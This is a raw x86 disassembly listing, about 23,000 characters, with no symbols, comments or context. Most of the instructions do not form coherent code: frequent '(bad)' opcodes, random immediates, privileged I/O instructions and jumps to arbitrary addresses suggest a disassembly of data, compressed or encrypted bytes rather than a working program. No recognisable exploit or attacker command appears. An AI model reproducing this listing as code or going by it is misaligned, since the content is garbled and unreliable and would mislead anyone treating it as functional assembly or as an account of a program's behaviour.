  41978b:	mov    ds:0x1d565ab0,eax
  419790:	or     DWORD PTR [ebp+0x4f3f605a],esi
  419796:	addr16 mov ebx,0x7f27ef61
  41979c:	(bad)  
  41979d:	mov    ebx,0x1e84d13b
  4197a2:	cwde   
  4197a3:	ds cdq 
  4197a5:	jmp    0x9da1ad12
  4197aa:	cdq    
  4197ab:	shr    DWORD PTR [ebx],cl
  4197ad:	push   ebp
  4197ae:	test   BYTE PTR [ebx-0xe9f931f],cl
  4197b4:	sub    DWORD PTR [ebx-0x1e],edi
  4197b7:	dec    ebp
  4197b8:	test   DWORD PTR [edx],edx
  4197ba:	jg     0x419749
  4197bc:	in     eax,dx
  4197bd:	(bad)  
  4197be:	adc    al,BYTE PTR [edi-0x785726b1]
  4197c4:	mov    al,0xda
  4197c6:	aaa    
  4197c7:	jmp    0x60:0xd5a8cc48
  4197ce:	in     al,dx
  4197cf:	mov    eax,ds:0x73676b1a
  4197d4:	fld    DWORD PTR [ecx]
  4197d6:	imul   DWORD PTR [ebx]
  4197d8:	in     eax,dx
  4197d9:	(bad)  
  4197da:	push   0x6e23657c
  4197df:	shl    BYTE PTR ds:[esp+esi*8],1
  4197e3:	jecxz  0x4197e6
  4197e5:	jge    0x41982e
  4197e7:	or     DWORD PTR [ebx+0x76],esi
  4197ea:	jbe    0x41985b
  4197ec:	pop    es
  4197ed:	dec    eax
  4197ee:	ins    BYTE PTR es:[edi],dx
  4197ef:	mov    ch,0xcd
  4197f1:	or     dl,BYTE PTR [esi+edx*1-0x3b]
  4197f5:	push   0x71
  4197f7:	outs   dx,DWORD PTR ds:[esi]
  4197f8:	iret   
  4197f9:	sub    dh,BYTE PTR [esi-0x3]
  4197fc:	or     edi,0x6883bb5b
  419802:	into   
  419803:	(bad)  
  419804:	out    0x8a,al
  419806:	les    ebp,FWORD PTR [edi]
  419808:	sbb    DWORD PTR [edi],esi
  41980a:	lods   eax,DWORD PTR ds:[esi]
  41980b:	and    al,0x10
  41980d:	retf   0x9a02
  419810:	(bad)  
  419811:	(bad)  
  419812:	loopne 0x4197e1
  419814:	ss sub al,0x29
  419817:	not    BYTE PTR [ebp+0x3d6abae3]
  41981d:	int    0x2
  41981f:	pop    eax
  419820:	sbb    eax,0xb4301526
  419825:	icebp  
  419826:	(bad)  
  419827:	je     0x4197bc
  419829:	fucomi st,st(4)
  41982b:	or     bl,BYTE PTR [edi]
  41982d:	stos   BYTE PTR es:[edi],al
  41982e:	cmp    BYTE PTR [edi-0x2ac46088],dh
  419834:	dec    edx
  419835:	outs   dx,BYTE PTR ds:[esi]
  419836:	xchg   DWORD PTR [esi+0x2d209e17],esp
  41983c:	test   al,0x1d
  41983e:	call   DWORD PTR [ecx+0x7aadbf05]
  419844:	inc    ecx
  419845:	push   ebp
  419846:	ret    0xc8a1
  419849:	mov    eax,ds:0x78e7b125
  41984e:	and    al,BYTE PTR [edx-0x29]
  419851:	jns    0x4197f9
  419853:	iret   
  419854:	jecxz  0x4198bb
  419856:	or     DWORD PTR [esi+0x2],ebx
  419859:	js     0x419868
  41985b:	pop    edx
  41985c:	test   BYTE PTR [edi*4-0x589ce411],dl
  419863:	xchg   edi,eax
  419864:	std    
  419865:	arpl   bx,bp
  419867:	out    dx,eax
  419868:	stos   BYTE PTR es:[edi],al
  419869:	daa    
  41986a:	jnp    0x4198b6
  41986c:	sub    al,0x69
  41986e:	jo     0x4198e4
  419870:	inc    ebx
  419871:	cmp    ecx,DWORD PTR [ebp+0x675a0fda]
  419877:	retf   
  419878:	mov    ds:0x545d4aae,eax
  41987d:	jne    0x419806
  41987f:	jge    0x4198a3
  419881:	push   cs
  419882:	pop    esi
  419883:	or     DWORD PTR [eax-0x26],eax
  419886:	xlat   BYTE PTR ds:[ebx]
  419887:	add    BYTE PTR [edi],ah
  419889:	fsubp  st(6),st
  41988b:	pop    es
  41988c:	add    dh,BYTE PTR [esi]
  41988e:	imul   ebx,DWORD PTR ds:[ebx+0x3c],0xf0c18dc8
  419896:	and    DWORD PTR [edx+0x2c],esi
  419899:	inc    esp
  41989a:	xor    edi,ebp
  41989c:	xor    al,0x90
  41989e:	dec    ebp
  41989f:	cmp    BYTE PTR [eax-0x7e],dl
  4198a2:	ret    
  4198a3:	iret   
  4198a4:	dec    ecx
  4198a5:	pop    ss
  4198a6:	fwait
  4198a7:	dec    ebp
  4198a8:	pop    es
  4198a9:	ror    DWORD PTR [ebx-0x69],1
  4198ac:	imul   ebx,edi,0x1055b7e8
  4198b2:	add    al,0xc8
  4198b4:	ret    0xc874
  4198b7:	out    dx,al
  4198b8:	ja     0x4198ba
  4198ba:	lea    esi,[eax+0x1d]
  4198bd:	call   0x34c1240d
  4198c2:	xor    eax,0xc43027e
  4198c7:	adc    ch,dl
  4198c9:	pop    esp
  4198ca:	stc    
  4198cb:	mov    dh,0x25
  4198cd:	test   al,0xe1
  4198cf:	mov    esi,0xe1db78a
  4198d4:	in     al,0xee
  4198d6:	sbb    cl,BYTE PTR [ebx]
  4198d8:	loop   0x419927
  4198da:	fild   QWORD PTR ds:[edx+0x204b5768]
  4198e1:	cmp    DWORD PTR [ecx+ecx*1+0x4f],ecx
  4198e5:	fcomip st,st(5)
  4198e7:	rcl    bl,cl
  4198e9:	and    esp,edi
  4198eb:	lea    edx,[ecx]
  4198ed:	push   esp
  4198ee:	ret    0x1f27
  4198f1:	xchg   edx,eax
  4198f2:	je     0x41989a
  4198f4:	mov    eax,0x35e26d6e
  4198f9:	sub    BYTE PTR [edi+0x1d],ch
  4198fc:	(bad)  
  4198fd:	retf   0x81ba
  419900:	icebp  
  419901:	fcom   DWORD PTR [ecx+0x7c6b351f]
  419907:	mov    bl,0x78
  419909:	mov    edi,DWORD PTR [esi]
  41990b:	(bad)  
  41990c:	ficom  WORD PTR [eax]
  41990e:	jl     0x419957
  419910:	mov    ds:0x9fea1ce4,al
  419915:	scas   eax,DWORD PTR es:[edi]
  419916:	lock sar BYTE PTR ds:0x12acd1ea,1
  41991d:	enter  0xaf21,0x94
  419921:	mov    bl,0x6c
  419923:	adc    cl,BYTE PTR ds:0x8f8a8f71
  419929:	aas    
  41992a:	sbb    ecx,0x3f1fb171
  419930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419931:	cmp    BYTE PTR [ebx-0x36ba9a0f],0x38
  419938:	mov    cl,0xd5
  41993b:	loop   0x4198c9
  41993d:	jmp    0xc4b13bf0
  419942:	aaa    
  419943:	mov    esp,0xbfcae8bd
  419948:	setno  BYTE PTR [ebp-0x5b993d01]
  41994f:	ret    0x59d3
  419952:	fidivr WORD PTR [eax-0x442edf38]
  419958:	gs inc edi
  41995a:	addr16 iret 
  41995c:	pop    ecx
  41995d:	test   BYTE PTR [edi],0x8d
  419960:	jl     0x419900
  419962:	pop    ds
  419963:	(bad)  
  419964:	in     al,0x26
  419966:	in     eax,dx
  419967:	leave  
  419968:	sbb    BYTE PTR [edx-0x21],dh
  41996b:	pop    ecx
  41996c:	jae    0x41992c
  41996e:	clc    
  41996f:	jge    0x419914
  419971:	lods   eax,DWORD PTR ds:[esi]
  419972:	push   ds
  419973:	adc    esp,0x55dfd53e
  419979:	xor    BYTE PTR [ebp-0x52],bh
  41997c:	sub    edi,DWORD PTR [esi-0x29d81af0]
  419982:	pop    esi
  419983:	and    DWORD PTR [ecx+0x785900a6],ebp
  419989:	inc    ecx
  41998a:	mov    WORD PTR [eax],?
  41998c:	test   al,0x63
  41998e:	push   0x815d8e73
  419993:	sbb    cl,BYTE PTR [edx+0x421cdc2e]
  419999:	mov    bl,0x7
  41999b:	stos   DWORD PTR es:[edi],eax
  41999c:	arpl   WORD PTR [ecx+0x60],sp
  41999f:	ds and bl,ah
  4199a2:	pop    ss
  4199a3:	or     DWORD PTR [ecx+0x3b6bc652],esp
  4199a9:	sub    DWORD PTR [ebx],edx
  4199ab:	adc    eax,0x89f5e11c
  4199b0:	jmp    0x419949
  4199b2:	out    dx,eax
  4199b3:	push   esi
  4199b4:	inc    ebx
  4199b5:	mov    dh,0x9c
  4199b7:	jecxz  0x4199cd
  4199b9:	(bad)  
  4199ba:	dec    esp
  4199bb:	(bad)  
  4199bc:	out    0xf7,eax
  4199be:	adc    al,0xcd
  4199c0:	dec    ecx
  4199c1:	add    eax,0xf2188516
  4199c6:	in     eax,0x1
  4199c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199c9:	and    BYTE PTR [ebp+0x6655822d],bl
  4199cf:	xor    ebp,ecx
  4199d1:	add    BYTE PTR [edx-0x10],0xd4
  4199d5:	cmp    eax,0x99e6f77c
  4199da:	iret   
  4199db:	jbe    0x419a07
  4199dd:	enter  0x3af3,0x9c
  4199e1:	add    BYTE PTR [esi+0x3dff4f10],0xcf
  4199e8:	pop    eax
  4199e9:	push   0x38
  4199eb:	pop    ecx
  4199ec:	nop/reserved BYTE PTR [eax-0x4d5d19eb]
  4199f3:	mov    ch,0xc7
  4199f5:	lods   eax,DWORD PTR ds:[esi]
  4199f6:	int    0x1a
  4199f8:	adc    edi,edx
  4199fa:	mov    ah,0x48
  4199fc:	cwde   
  4199fd:	adc    BYTE PTR [ecx],0x68
  419a00:	push   ecx
  419a01:	push   ebx
  419a02:	sub    BYTE PTR [eax+0x4f],dh
  419a05:	jno    0x419a7c
  419a07:	cdq    
  419a08:	popa   
  419a09:	aas    
  419a0a:	dec    edx
  419a0b:	popa   
  419a0c:	add    ch,BYTE PTR [edx-0x298dc26f]
  419a12:	imul   ebx,DWORD PTR [edi+0x5d],0x4d614a6c
  419a19:	mov    dh,BYTE PTR [ecx+eiz*1]
  419a1c:	fisttp WORD PTR [edx+ecx*4-0x50]
  419a20:	mov    edi,0xe300f865
  419a25:	(bad)  
  419a26:	pop    esi
  419a27:	xor    BYTE PTR [ecx-0x34],0x3b
  419a2b:	mov    dh,0x9c
  419a2d:	mov    edi,0x300820f4
  419a32:	ins    DWORD PTR es:[edi],dx
  419a33:	leave  
  419a34:	add    esp,ecx
  419a36:	repz adc esp,DWORD PTR [edi+0x1834f232]
  419a3d:	xchg   esi,eax
  419a3e:	int3   
  419a3f:	aas    
  419a40:	sub    ah,BYTE PTR [ebx-0x42]
  419a43:	cmp    al,0xd0
  419a45:	mov    ecx,0xcfa03481
  419a4a:	jmp    0x4e96f0ce
  419a4f:	xchg   BYTE PTR [eax+0x6198a279],bh
  419a55:	pushf  
  419a56:	push   ds
  419a57:	scas   al,BYTE PTR es:[edi]
  419a58:	mov    ebx,0x8ed76312
  419a5d:	in     al,0xd1
  419a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a60:	mov    eax,0x33dcae8b
  419a65:	push   esp
  419a66:	xlat   BYTE PTR ds:[ebx]
  419a67:	mov    ch,0x7
  419a69:	or     esp,esp
  419a6b:	stc    
  419a6c:	int3   
  419a6d:	mov    bl,0x73
  419a6f:	jp     0x4199ff
  419a71:	mov    ebp,0x761aba0
  419a76:	jmp    0x419aac
  419a78:	jmp    ebp
  419a7a:	or     DWORD PTR [eax-0x2b24ef2d],0xffffff94
  419a81:	dec    ebp
  419a82:	mov    bh,0x3e
  419a84:	push   ds
  419a85:	or     BYTE PTR [ebx-0x6d],bl
  419a88:	rcl    DWORD PTR [ebx-0x237858e1],1
  419a8e:	jns    0x419af6
  419a90:	mov    BYTE PTR [ebx+edx*2],cl
  419a93:	sub    al,BYTE PTR [edx+0x77dc7ef]
  419a99:	mov    bh,0x7d
  419a9b:	sbb    BYTE PTR [eax],ch
  419a9d:	push   edi
  419a9e:	call   0x720259b1
  419aa3:	jmp    0xea33:0x62d79c77
  419aaa:	test   bl,ah
  419aac:	xor    ecx,DWORD PTR [ecx-0x42]
  419aaf:	repz mov al,0x70
  419ab2:	xchg   edx,eax
  419ab3:	xor    edi,DWORD PTR [ebx-0xd1b76b4]
  419ab9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419abb:	hlt    
  419abc:	xchg   ebx,eax
  419abd:	push   0xfffffffb
  419abf:	and    eax,0x1cbb7505
  419ac4:	fdivp  st(6),st
  419ac6:	int    0x88
  419ac8:	sub    ah,0x5b
  419acb:	mov    eax,DWORD PTR [ebx+0x3141e43f]
  419ad1:	mov    ecx,0x843457f9
  419ad6:	mov    edi,0xd64c2743
  419adb:	fdiv   DWORD PTR ds:0xc4ce6712
  419ae1:	imul   eax,DWORD PTR [eax-0x6228ab96],0xffffff84
  419ae8:	mov    dh,0x71
  419aea:	ror    BYTE PTR [edi],0xf6
  419aed:	push   cs
  419aee:	sub    DWORD PTR [edi],edx
  419af0:	xchg   DWORD PTR [eax+0x37],ebx
  419af3:	cmp    BYTE PTR [edx+0x3d],bl
  419af6:	daa    
  419af7:	and    DWORD PTR [edi+0x5ccdd422],ebx
  419afd:	es lock es sub eax,0x56525b30
  419b05:	lahf   
  419b06:	mov    dh,0xed
  419b08:	xlat   BYTE PTR ds:[ebx]
  419b09:	pop    eax
  419b0a:	test   al,0x3f
  419b0c:	inc    edi
  419b0d:	dec    esp
  419b0e:	stos   BYTE PTR es:[edi],al
  419b0f:	mov    ch,0xbe
  419b11:	inc    eax
  419b12:	call   0x4836:0x5385e536
  419b19:	xchg   ebp,eax
  419b1a:	xchg   esp,eax
  419b1b:	ss pusha 
  419b1d:	push   0x39252756
  419b22:	push   esi
  419b23:	xchg   ebp,eax
  419b24:	loopne 0x419b86
  419b26:	push   edx
  419b27:	ret    0x289a
  419b2a:	test   bl,al
  419b2c:	jg     0x419bac
  419b2e:	or     al,0xed
  419b30:	jmp    0x33a376f2
  419b35:	jb     0x419b5b
  419b37:	mov    dl,0x7c
  419b39:	aas    
  419b3a:	ins    DWORD PTR es:[edi],dx
  419b3b:	push   esi
  419b3c:	bound  ebp,QWORD PTR [edi+0x4b]
  419b3f:	outs   dx,BYTE PTR ds:[esi]
  419b40:	push   edi
  419b41:	cld    
  419b42:	jle    0x419b68
  419b44:	xchg   BYTE PTR [ebp+0x7],bh
  419b47:	mov    al,ds:0xc5e7069f
  419b4c:	sbb    ebx,DWORD PTR [eax-0x61]
  419b4f:	retf   0x242d
  419b52:	jbe    0x419af8
  419b54:	and    eax,0xfce26634
  419b59:	push   cs
  419b5a:	and    ch,bl
  419b5c:	das    
  419b5d:	mov    eax,ds:0x2b0a9cab
  419b62:	loopne 0x419bb9
  419b64:	mov    edx,0x7e7879de
  419b69:	sbb    edx,DWORD PTR [ecx+edx*1+0x77]
  419b6d:	jbe    0x419b6b
  419b6f:	push   ax
  419b71:	outs   dx,BYTE PTR ds:[esi]
  419b72:	les    edx,FWORD PTR [ebx+0x51]
  419b75:	jge    0x419b3d
  419b77:	adc    dl,bl
  419b79:	inc    ebx
  419b7a:	or     DWORD PTR ds:0x46dec920,0xfffffff2
  419b81:	dec    BYTE PTR [eax]
  419b83:	xchg   ebp,eax
  419b84:	jg     0x419b69
  419b86:	daa    
  419b87:	fisub  DWORD PTR [edi-0x736e5589]
  419b8d:	cdq    
  419b8e:	lods   eax,DWORD PTR ds:[esi]
  419b8f:	mov    ecx,cs
  419b91:	sub    al,0x1e
  419b93:	xchg   esi,eax
  419b94:	sbb    esi,DWORD PTR [eax+0x5771b429]
  419b9a:	cmc    
  419b9b:	outs   dx,BYTE PTR ds:[esi]
  419b9c:	push   es
  419b9d:	scas   al,BYTE PTR es:[edi]
  419b9e:	dec    esp
  419b9f:	xchg   ebp,eax
  419ba0:	out    dx,eax
  419ba1:	mov    esp,0xc681a863
  419ba6:	cwde   
  419ba7:	arpl   bp,bp
  419ba9:	ja     0x419b80
  419bab:	cdq    
  419bac:	nop
  419bad:	inc    ebp
  419bae:	push   eax
  419baf:	cmc    
  419bb0:	or     DWORD PTR [esi+0x79],ecx
  419bb3:	cld    
  419bb4:	mov    edx,fs
  419bb6:	(bad)  [ecx]
  419bb8:	cwde   
  419bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bba:	inc    edx
  419bbb:	sub    BYTE PTR [ebx],0x67
  419bbe:	pop    es
  419bbf:	(bad)  
  419bc0:	jno    0x419c36
  419bc2:	or     BYTE PTR [esi],0x40
  419bc5:	fist   WORD PTR [edi]
  419bc7:	fsub   DWORD PTR [eax]
  419bc9:	inc    ebx
  419bca:	sti    
  419bcb:	xchg   cl,ch
  419bcd:	xor    eax,0x4c686f6e
  419bd2:	fs xchg bh,cl
  419bd5:	jmp    0x5f16:0x791f3da8
  419bdc:	and    ebp,DWORD PTR [eax]
  419bde:	scas   al,BYTE PTR es:[edi]
  419bdf:	jnp    0x419be8
  419be1:	sub    BYTE PTR [ecx-0x606f0846],bh
  419be7:	out    0x76,al
  419be9:	or     dh,BYTE PTR [eax-0x2]
  419bec:	rcr    DWORD PTR ds:0x7cb2513e,0xd4
  419bf3:	sub    cx,WORD PTR [ecx+esi*1-0x6a109452]
  419bfb:	rcr    edx,0xd0
  419bfe:	jae    0x419c02
  419c00:	jbe    0x419c76
  419c02:	pop    edx
  419c03:	sub    al,BYTE PTR [eax]
  419c05:	mov    dl,0xa9
  419c07:	inc    edi
  419c08:	fidiv  DWORD PTR [edi+0x5f6c2c65]
  419c0e:	ret    0x409b
  419c11:	lods   al,BYTE PTR ds:[esi]
  419c12:	jp     0x419c1c
  419c14:	xor    al,BYTE PTR [eax+ebp*8-0x76]
  419c18:	(bad)  
  419c19:	icebp  
  419c1a:	int3   
  419c1b:	(bad)  
  419c1c:	daa    
  419c1d:	cmp    BYTE PTR [eax+0x704199c6],ch
  419c23:	xchg   BYTE PTR [eax],dl
  419c25:	lea    esi,[esi+0x32]
  419c28:	mov    ch,bl
  419c2a:	das    
  419c2b:	in     al,dx
  419c2c:	add    eax,0x44833e88
  419c31:	cli    
  419c32:	pop    ecx
  419c33:	xchg   BYTE PTR [ebp+0xc],bh
  419c36:	rol    cl,cl
  419c38:	pop    ebx
  419c39:	fistp  WORD PTR [esp+edx*2]
  419c3c:	lods   eax,DWORD PTR ds:[esi]
  419c3d:	or     al,0x8
  419c3f:	and    eax,0x8349cee4
  419c44:	dec    ebx
  419c45:	test   BYTE PTR [esi],al
  419c47:	aaa    
  419c48:	test   BYTE PTR [ebp+0x78],bh
  419c4b:	sbb    DWORD PTR [eax+0x14],eax
  419c4e:	std    
  419c4f:	cmc    
  419c50:	in     eax,dx
  419c51:	add    eax,0x44e6d634
  419c56:	xor    esp,DWORD PTR [edi+0x30]
  419c59:	push   0xffffffb1
  419c5b:	lahf   
  419c5c:	mov    dl,0xb4
  419c5e:	in     eax,0xb
  419c60:	inc    edx
  419c61:	xchg   esp,eax
  419c62:	fidiv  WORD PTR [edx]
  419c64:	int3   
  419c65:	test   eax,0x65190b9f
  419c6a:	push   ebx
  419c6b:	adc    esp,esi
  419c6d:	dec    esp
  419c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c6f:	popa   
  419c70:	jle    0x419cc2
  419c72:	add    al,0xc5
  419c74:	dec    edx
  419c75:	xlat   BYTE PTR ds:[ebx]
  419c76:	add    DWORD PTR [esi],ecx
  419c78:	cwde   
  419c79:	js     0x419ca2
  419c7b:	retf   0x141a
  419c7e:	jmp    0xb998:0x2e1fe85d
  419c85:	push   0x53093544
  419c8a:	push   0x76
  419c8c:	mov    ebp,0x24547339
  419c91:	sbb    ebp,DWORD PTR [eax]
  419c93:	add    BYTE PTR [edx-0x3429f286],dh
  419c99:	xchg   edx,eax
  419c9a:	inc    edi
  419c9b:	xor    BYTE PTR [edi+0x66f320d8],dl
  419ca1:	repnz fcomi st,st(1)
  419ca4:	in     eax,0xa
  419ca6:	and    al,0x32
  419ca8:	xchg   esp,eax
  419ca9:	les    ebx,FWORD PTR [eax*8+0x77ac12cd]
  419cb0:	pop    edx
  419cb1:	gs pop edi
  419cb3:	xor    esi,edx
  419cb5:	aam    0x45
  419cb7:	lock mov eax,ds:0xd2709f36
  419cbd:	mov    bh,0x6e
  419cbf:	inc    ebp
  419cc0:	cmc    
  419cc1:	mov    bh,0x62
  419cc3:	mov    cl,0x5b
  419cc5:	push   0x41
  419cc7:	or     DWORD PTR [ecx-0x36],edi
  419cca:	or     al,0xc6
  419ccc:	jae    0x419cde
  419cce:	aad    0xe7
  419cd0:	in     eax,dx
  419cd1:	lods   eax,DWORD PTR ds:[esi]
  419cd2:	fst    st(7)
  419cd4:	and    bh,BYTE PTR [esi-0x11]
  419cd7:	repnz cld 
  419cd9:	retf   0x19c4
  419cdc:	js     0x419c6c
  419cde:	cli    
  419cdf:	jmp    0x419ccf
  419ce1:	rol    DWORD PTR [ebx+0x58],cl
  419ce4:	cmp    al,0xbc
  419ce6:	cmp    BYTE PTR [edi+ebx*1-0x34],cl
  419cea:	pop    esp
  419ceb:	add    BYTE PTR [ebp+ecx*4+0x5e],0x73
  419cf0:	mov    edi,DWORD PTR [ecx]
  419cf2:	sub    al,0xbb
  419cf4:	(bad)  
  419cf5:	lods   eax,DWORD PTR ds:[esi]
  419cf6:	cmc    
  419cf7:	nop
  419cf8:	mov    al,0x12
  419cfa:	(bad)  
  419cfc:	ss btr eax,ebp
  419d00:	xchg   ecx,eax
  419d01:	(bad)
  419d05:	add    al,dh
  419d07:	sbb    al,0x6c
  419d09:	inc    ebp
  419d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d0b:	inc    edi
  419d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d0d:	add    ecx,DWORD PTR [edx+0x53]
  419d10:	in     eax,dx
  419d11:	pop    edx
  419d12:	mov    ds:0x95142142,al
  419d17:	mov    BYTE PTR [esi+esi*1+0x1f90373f],ah
  419d1e:	add    ebx,DWORD PTR [edx]
  419d20:	es ret 
  419d22:	jo     0x419d40
  419d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d25:	retf   
  419d26:	nop
  419d27:	out    dx,eax
  419d28:	fnstcw WORD PTR [eax+esi*4+0x389611e2]
  419d2f:	les    edi,FWORD PTR [ebx+eax*1-0x4bd26bfd]
  419d36:	scas   al,BYTE PTR es:[edi]
  419d37:	imul   ebp,DWORD PTR [eax-0x18a051a3],0xffffff88
  419d3e:	ss cmp ch,al
  419d41:	outs   dx,BYTE PTR ds:[esi]
  419d42:	ror    BYTE PTR [ebp-0x7d9d92ed],cl
  419d48:	xchg   esi,eax
  419d49:	push   ss
  419d4a:	push   cs
  419d4b:	mov    esi,0x238ae163
  419d50:	or     edx,esp
  419d52:	sti    
  419d53:	push   esi
  419d54:	jmp    0x419d51
  419d56:	fnstcw WORD PTR [edi-0x36489213]
  419d5c:	jbe    0x419d05
  419d5e:	in     eax,0x53
  419d60:	into   
  419d61:	sbb    ecx,DWORD PTR [edx+edx*1+0x224d021b]
  419d68:	fcmovu st,st(0)
  419d6a:	mov    eax,0x63843879
  419d6f:	fcom   QWORD PTR [edx+0x11900243]
  419d75:	push   esp
  419d76:	pop    edi
  419d77:	sahf   
  419d78:	xchg   ebp,eax
  419d79:	add    al,0xda
  419d7b:	repz inc ebx
  419d7d:	out    dx,eax
  419d7e:	imul   sp,WORD PTR [edx],0x4186
  419d83:	enter  0x25c8,0xee
  419d87:	fiadd  WORD PTR [edx+ebp*1]
  419d8a:	popf   
  419d8b:	nop
  419d8c:	xor    al,ah
  419d8e:	idiv   BYTE PTR [ecx-0xa]
  419d91:	mov    ebx,0x4b7d39aa
  419d96:	dec    ecx
  419d97:	into   
  419d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d99:	cdq    
  419d9a:	mov    edi,edi
  419d9c:	mov    eax,ds:0x1c86c096
  419da1:	push   DWORD PTR [edx]
  419da3:	into   
  419da4:	cmp    al,0xa5
  419da6:	clc    
  419da7:	dec    BYTE PTR [eax+0x2]
  419daa:	(bad)  
  419dab:	push   ebp
  419dac:	leave  
  419dad:	clc    
  419dae:	push   ebx
  419daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419db0:	frstor [eax+0x5a120aab]
  419db6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  419db8:	shr    BYTE PTR fs:[edx-0x594ea9d7],0x25
  419dc0:	test   BYTE PTR [edi],dl
  419dc2:	and    edx,DWORD PTR [ecx]
  419dc4:	rcr    BYTE PTR [edi+0x3a],1
  419dc7:	add    BYTE PTR es:[ecx],dl
  419dca:	and    al,0x1d
  419dcc:	dec    edi
  419dcd:	hlt    
  419dce:	mov    fs,WORD PTR fs:[ebp+0x63]
  419dd2:	gs xor al,0x4e
  419dd5:	push   ss
  419dd6:	and    DWORD PTR [ebp+0x640e21dc],edx
  419ddc:	xchg   edi,eax
  419ddd:	(bad)  [ebx+0x1f7de0d7]
  419de3:	out    0x41,eax
  419de5:	(bad)  
  419de6:	mov    eax,ss:0x5b595810
  419dec:	sbb    al,0xff
  419dee:	sbb    al,0x8b
  419df0:	and    DWORD PTR [edi+0x574cfea8],ebx
  419df6:	inc    edx
  419df7:	daa    
  419df8:	rcl    DWORD PTR [edx+0x5e0414a6],0xf
  419dff:	pop    esi
  419e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e01:	repz lea edi,[ecx+0x2e]
  419e05:	cld    
  419e06:	aaa    
  419e07:	nop
  419e08:	neg    BYTE PTR [ebx]
  419e0a:	mov    ecx,ebx
  419e0c:	mov    BYTE PTR [esi],ch
  419e0e:	sub    eax,0xdeaab49d
  419e13:	mov    dl,0x29
  419e15:	int3   
  419e16:	mov    eax,0xfb37191d
  419e1b:	daa    
  419e1c:	es or  al,0x22
  419e1f:	ins    DWORD PTR es:[edi],dx
  419e20:	sub    BYTE PTR [ebx+0x66],0xe5
  419e24:	pop    esi
  419e25:	xor    DWORD PTR [ecx],esi
  419e27:	into   
  419e28:	js     0x419e48
  419e2a:	scas   eax,DWORD PTR es:[edi]
  419e2b:	cmp    al,0x52
  419e2d:	nop
  419e2e:	mov    eax,0x7915d216
  419e33:	cdq    
  419e34:	cwde   
  419e35:	test   DWORD PTR [ecx+0x13f4bed6],ecx
  419e3b:	and    al,0x16
  419e3d:	and    eax,0x39a5331a
  419e42:	neg    BYTE PTR [ebp+0x8]
  419e45:	shl    DWORD PTR ss:[edi],1
  419e48:	dec    esi
  419e49:	enter  0x1c0,0xaf
  419e4d:	rcr    edx,cl
  419e4f:	xlat   BYTE PTR ds:[ebx]
  419e50:	retf   0xe57e
  419e53:	dec    edx
  419e54:	push   eax
  419e55:	sub    al,0x28
  419e57:	mov    WORD PTR [eax-0x440324a3],es
  419e5d:	pop    ebx
  419e5e:	mov    ebp,0xa564cec2
  419e63:	gs js  0x419e63
  419e66:	sbb    ebx,DWORD PTR [esi-0x37e14102]
  419e6c:	out    dx,eax
  419e6d:	icebp  
  419e6e:	outs   dx,BYTE PTR ds:[esi]
  419e6f:	mov    ds:0x99e1d701,eax
  419e74:	or     DWORD PTR [edi],0xffffffc0
  419e77:	lea    esi,[ecx-0x6ed33063]
  419e7d:	mov    dl,BYTE PTR [ebx]
  419e7f:	(bad)  
  419e80:	fs (bad) 
  419e82:	test   eax,0x967c31f4
  419e87:	jle    0x419e81
  419e89:	inc    eax
  419e8a:	(bad)  
  419e8c:	mov    edx,0x44c0ea1f
  419e91:	rcl    DWORD PTR [ebx],0x99
  419e94:	icebp  
  419e95:	add    eax,DWORD PTR [ebx-0x1f52b51f]
  419e9b:	popf   
  419e9c:	(bad)  
  419e9d:	cmp    BYTE PTR [ebp+edx*1-0x64875857],cl
  419ea4:	push   0xffffff8d
  419ea6:	sbb    bh,BYTE PTR [ecx]
  419ea8:	fiadd  DWORD PTR [ebx-0x72aa9c88]
  419eae:	sbb    BYTE PTR [ecx-0x34a9c2fb],al
  419eb4:	and    DWORD PTR [edi-0x6],eax
  419eb7:	mov    dh,BYTE PTR [eax-0x78]
  419eba:	dec    ecx
  419ebb:	dec    esp
  419ebc:	jo     0x419e6f
  419ebe:	daa    
  419ebf:	sbb    esp,0x907e2687
  419ec5:	push   esp
  419ec6:	mov    BYTE PTR [eax-0x7],bh
  419ec9:	sahf   
  419eca:	js     0x419eae
  419ecc:	es (bad) 
  419ece:	xchg   ecx,eax
  419ecf:	(bad)  
  419ed0:	out    dx,eax
  419ed1:	push   ecx
  419ed2:	push   0x9ebecb2c
  419ed7:	add    eax,0x85c20ce2
  419edc:	cmp    ch,BYTE PTR [eax-0x3f]
  419edf:	sar    ch,0x51
  419ee2:	xor    DWORD PTR ss:[ecx-0x6fe6637b],ecx
  419ee9:	ss shr esi,cl
  419eec:	leave  
  419eed:	aas    
  419eee:	int3   
  419eef:	enter  0x54ac,0x77
  419ef3:	cmc    
  419ef4:	imul   eax
  419ef6:	jecxz  0x419e97
  419ef8:	clc    
  419ef9:	push   ebp
  419efa:	mov    eax,0xb23f79d7
  419eff:	loope  0x419eb2
  419f01:	stc    
  419f02:	mov    BYTE PTR [eax-0x5df90cfc],cl
  419f08:	sahf   
  419f09:	inc    edx
  419f0a:	mov    ds:0x20dfe6ec,al
  419f0f:	jo     0x419f3e
  419f11:	jmp    0x8056:0xd5f721e5
  419f18:	pop    edx
  419f19:	and    eax,0x81073613
  419f1e:	mov    edi,0xb4aaf809
  419f23:	sub    dh,BYTE PTR [edx]
  419f25:	jle    0x419f92
  419f27:	(bad)  
  419f28:	out    0x7e,al
  419f2a:	adc    eax,0xd24e2052
  419f2f:	fwait
  419f30:	push   ebx
  419f31:	mov    ebx,0xdffeee54
  419f36:	mov    ebp,0x61dd3cee
  419f3b:	add    DWORD PTR [edx+edx*4-0x1b81b2c9],esp
  419f42:	cld    
  419f43:	mov    ch,0xda
  419f45:	inc    ecx
  419f46:	fld    QWORD PTR [esi+0x0]
  419f49:	daa    
  419f4a:	and    eax,0xd36dbfc3
  419f4f:	and    edi,eax
